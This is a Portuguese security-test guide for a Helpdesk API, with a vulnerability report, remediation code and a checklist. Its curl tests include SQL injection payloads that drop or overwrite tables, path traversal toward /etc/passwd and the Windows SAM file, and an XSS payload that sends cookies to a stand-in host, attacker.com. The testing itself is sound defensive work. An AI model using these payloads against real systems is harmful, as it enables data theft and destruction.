## 🔒 Testes de Segurança - Helpdesk API

### Como Executar

```bash
# 1. Inicie o servidor
npm start

# 2. Em outro terminal, execute os testes
node security-tests.js
```

---

## 📋 Testes Manuais com CURL

### 1. Teste de Validação de Entrada

```bash
# Criar ticket com campos vazios
curl -X POST http://localhost:3000/api/tickets \
  -H "Content-Type: application/json" \
  -d '{"titulo":"","descricao":""}'

# Criar ticket com payload muito grande (potencial DoS)
curl -X POST http://localhost:3000/api/tickets \
  -H "Content-Type: application/json" \
  -d '{
    "titulo":"'$(printf 'A%.0s' {1..5000})'",
    "descricao":"teste"
  }'

# Tipos de dados inválidos
curl -X POST http://localhost:3000/api/tickets \
  -H "Content-Type: application/json" \
  -d '{
    "titulo": {"objeto": "aqui"},
    "descricao": ["array"]
  }'
```

### 2. Teste de SQL Injection

```bash
# SQL Injection no GET
curl "http://localhost:3000/api/tickets' OR '1'='1"

# SQL Injection no POST (DROP TABLE)
curl -X POST http://localhost:3000/api/tickets \
  -H "Content-Type: application/json" \
  -d '{
    "titulo": "teste",
    "descricao": "test;DROP TABLE tickets;--"
  }'

# SQL Injection no PUT
curl -X PUT http://localhost:3000/api/tickets/1 \
  -H "Content-Type: application/json" \
  -d '{
    "titulo": "'\''  OR '\''1'\''='\'1",
    "status": "'; UPDATE tickets SET status='\''HACKED'\''; --"
  }'

# Depois verificar se a tabela ainda existe
curl http://localhost:3000/api/tickets
```

### 3. Teste de XSS (Cross-Site Scripting)

```bash
# Stored XSS em título
curl -X POST http://localhost:3000/api/tickets \
  -H "Content-Type: application/json" \
  -d '{
    "titulo": "<script>alert(\"XSS Attack\")</script>",
    "descricao": "teste"
  }'

# Stored XSS com evento
curl -X POST http://localhost:3000/api/tickets \
  -H "Content-Type: application/json" \
  -d '{
    "titulo": "<img src=x onerror=\"fetch(\"http://attacker.com?cookie=\"+document.cookie)\">",
    "descricao": "teste"
  }'

# Depois listar e verificar se o script é escapado
curl http://localhost:3000/api/tickets

# HTML tags
curl -X POST http://localhost:3000/api/tickets \
  -H "Content-Type: application/json" \
  -d '{
    "titulo": "<iframe src=\"javascript:alert(1)\"></iframe>",
    "descricao": "teste"
  }'
```

### 4. Headers de Segurança HTTP

```bash
# Verificar headers retornados
curl -i http://localhost:3000/

# Procure por:
# - X-Content-Type-Options: nosniff
# - X-Frame-Options: DENY ou SAMEORIGIN
# - X-XSS-Protection: 1; mode=block
# - Strict-Transport-Security
# - Content-Security-Policy
```

### 5. Teste de Autenticação/Autorização

```bash
# Listar todos os tickets (sem autenticação)
curl http://localhost:3000/api/tickets

# Criar ticket sem ser autenticado
curl -X POST http://localhost:3000/api/tickets \
  -H "Content-Type: application/json" \
  -d '{"titulo":"teste","descricao":"teste"}'

# Editar ticket alheio (sem autorização)
# Primeiro cria um ticket
TICKET_ID=$(curl -s -X POST http://localhost:3000/api/tickets \
  -H "Content-Type: application/json" \
  -d '{"titulo":"ticket1","descricao":"teste"}' | jq -r '.id')

# Depois tenta editar como outro usuário
curl -X PUT http://localhost:3000/api/tickets/$TICKET_ID \
  -H "Content-Type: application/json" \
  -d '{"status":"Closed", "assignee":"hacker"}'
```

### 6. Teste de Rate Limiting

```bash
# Enviar múltiplas requisições rapidamente
for i in {1..30}; do
  curl -X POST http://localhost:3000/api/tickets \
    -H "Content-Type: application/json" \
    -d "{\"titulo\":\"Test$i\",\"descricao\":\"teste\"}" &
done
wait

# Aguardar 5 segundos de requisições rápidas
# Se não houver bloqueio (status 429), não há rate limiting
```

### 7. Path Traversal

```bash
# Tenta acessar arquivos do sistema
curl http://localhost:3000/api/tickets/../../../../etc/passwd
curl http://localhost:3000/api/tickets/../../../secret.env
curl "http://localhost:3000/api/tickets/../../../windows/system32/config/sam"

# Tenta usar encoding
curl "http://localhost:3000/api/tickets/..%2F..%2F..%2Fetc%2Fpasswd"
```

### 8. Enumeração de Recursos (Broken Access Control)

```bash
# IDs sequenciais permitem enumerar
for i in {1..100}; do
  curl -s http://localhost:3000/api/tickets/$i | jq '.numero_ticket' 2>/dev/null
done

# Tenta acessar endpoints de admin
curl http://localhost:3000/api/admin/users
curl http://localhost:3000/api/admin/settings
curl http://localhost:3000/api/admin/database
```

---

## 🚨 Vulnerabilidades Encontradas

### 🔴 CRÍTICAS

#### 1. **Falta de Autenticação**
- **Severidade**: CRÍTICA
- **Descrição**: Qualquer pessoa pode criar, ler e editar tickets
- **Impacto**: Acesso não autorizado a todos os dados
- **Como explorar**: Nenhum token/sessão é requerido

#### 2. **Falta de Autorização**
- **Severidade**: CRÍTICA
- **Descrição**: Não há verificação se o usuário pode editar um recurso
- **Impacto**: Qualquer um pode editar qualquer ticket
- **Como explorar**: `PUT /api/tickets/1` sem ter criado

#### 3. **Insecure Direct Object Reference (IDOR)**
- **Severidade**: ALTA
- **Descrição**: IDs sequenciais permitem enumerar todos os recursos
- **Impacto**: Dados sensíveis podem ser descobertos por força bruta
- **Como explorar**: Iterando IDs de 1 a 9999

### 🟠 ALTAS

#### 4. **Falta de Validação de Entrada**
- **Severidade**: ALTA
- **Descrição**: Campos aceitam valores nulos, muito grandes ou inválidos
- **Impacto**: DoS, injeção de dados malformados
- **Como explorar**: POST com `titulo: ""` ou payload gigante (10MB+)

#### 5. **Sem Rate Limiting**
- **Severidade**: ALTA
- **Descrição**: Nenhuma proteção contra força bruta ou DoS
- **Impacto**: Servidor pode ser sobrecarregado
- **Como explorar**: Loop de 1000 requisições/segundo

#### 6. **Armazenamento Inseguro de Dados (Stored XSS)**
- **Severidade**: MÉDIA-ALTA
- **Descrição**: Não há sanitização de entrada, scripts maliciosos são armazenados
- **Impacto**: Quando outro usuário vê o ticket, o script executa
- **Como explorar**: POST com `titulo: "<script>alert(1)</script>"`

#### 7. **Sem Headers de Segurança**
- **Severidade**: MÉDIA
- **Descrição**: Faltam headers HTTP essenciais
- **Impacto**: Vulnerável a XSS, clickjacking, MIME-sniffing
- **Como explorar**: Depende do header (todos presentes = lista vazia)

### 🟡 MÉDIAS

#### 8. **CORS não configurado**
- **Severidade**: MÉDIA
- **Descrição**: Qualquer origem pode fazer requisições
- **Impacto**: Ataques CSRF e acesso inter-domínio não autorizado
- **Como explorar**: Script em domínio diferente pode acessar a API

#### 9. **Acesso ao Banco de Dados Público**
- **Severidade**: MÉDIA
- **Descrição**: `helpdesk.db` pode estar acessível publicamente
- **Impacto**: Banco inteiro pode ser baixado
- **Como explorar**: `curl http://localhost:3000/helpdesk.db`

#### 10. **Sem Logging de Segurança**
- **Severidade**: MÉDIA
- **Descrição**: Nenhum log de atividades ou erros
- **Impacto**: Impossível auditar ou detectar ataques
- **Como explorar**: Modificar dados sem deixar rastros

---

## 📊 Matriz de Risco

```
┌─────────────────────┬──────────┬────────────┐
│ Vulnerabilidade     │ Severidade│ Probabilidade
├─────────────────────┼──────────┼────────────┤
│ Falta de Auth       │ CRÍTICA  │ MuitoAlta
│ Falta de Authz      │ CRÍTICA  │ MuitoAlta
│ IDOR                │ ALTA     │ Certa
│ Sem Validação       │ ALTA     │ Certa
│ Sem Rate Limiting   │ ALTA     │ Alta
│ Stored XSS          │ ALTA     │ Alta
│ Sem Headers         │ MÉDIA    │ Alta
│ CORS aberto         │ MÉDIA    │ Média
│ DB público          │ MÉDIA    │ Média
│ Sem Logging         │ MÉDIA    │ Baixa
└─────────────────────┴──────────┴────────────┘
```

---

## ✅ Recomendações de Segurança

### Prioridade 1: IMEDIATO (Crítico)

```javascript
// 1. Implementar autenticação (JWT/Sessions)
app.use((req, res, next) => {
    const token = req.headers.authorization?.replace('Bearer ', '');
    if (!token) return res.status(401).json({ error: 'Não autorizado' });
    // Validar token
    next();
});

// 2. Implementar autorização
router.put('/api/tickets/:id', (req, res) => {
    const userId = req.user.id; // Do token
    const { id } = req.params;
    
    db.get('SELECT * FROM tickets WHERE id = ? AND assignee = ?', [id, userId], (err, ticket) => {
        if (!ticket) return res.status(403).json({ error: 'Acesso negado' });
        // Processar atualização
    });
});

// 3. Validar entrada
const validateTicket = (req, res, next) => {
    const { titulo, descricao, status, prioridade } = req.body;
    
    if (!titulo || typeof titulo !== 'string' || titulo.length === 0 || titulo.length > 255)
        return res.status(400).json({ error: 'Título inválido' });
    
    if (!descricao || typeof descricao !== 'string' || descricao.length === 0 || descricao.length > 5000)
        return res.status(400).json({ error: 'Descrição inválida' });
    
    if (status && !['To Do', 'In Progress', 'Done'].includes(status))
        return res.status(400).json({ error: 'Status inválido' });
    
    next();
};

router.post('/api/tickets', validateTicket, (req, res) => {
    // Criar ticket
});
```

### Prioridade 2: IMPORTANTE (30 dias)

```javascript
// 4. Headers de segurança
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'");
    next();
});

// 5. Rate limiting
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100
});
app.use(limiter);

// 6. CORS
const cors = require('cors');
app.use(cors({ origin: 'https://seu-dominio.com' }));
```

### Prioridade 3: BOAS PRÁTICAS (60 dias)

```javascript
// 7. Usar UUIDs ao invés de IDs sequenciais
const { v4: uuid } = require('uuid');
const id = uuid();

// 8. Logging de segurança
const winston = require('winston');
logger.warn(`Tentativa de acesso não autorizado ao ticket ${id} pelo usuário ${userId}`);

// 9. Proteger banco de dados
app.use(express.static(path.join(__dirname, 'public')));
// NÃO servir .db files
// Usar .gitignore: *.db

// 10. Sanitizar XSS (no frontend)
const sanitizeHtml = require('sanitize-html');
const cleaned = sanitizeHtml(userInput, { allowedTags: [], allowedAttributes: {} });
```

---

## 🔍 Referências OWASP

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

## 📝 Checklist de Segurança

- [ ] Autenticação implementada (JWT, OAuth, Sessions)
- [ ] Autorização em todos os endpoints
- [ ] Validação de entrada em todos os campos
- [ ] Rate limiting configurado
- [ ] Headers de segurança HTTP
- [ ] CORS restrito a domínios conhecidos
- [ ] XSS/HTML escapado no frontend
- [ ] Banco de dados não servido publicamente
- [ ] Logging e monitoramento
- [ ] Testes de segurança automatizados
- [ ] Secrets em .env (não em código)
- [ ] HTTPS em produção
- [ ] Dependências atualizadas
- [ ] Testes de penetração por terceiro

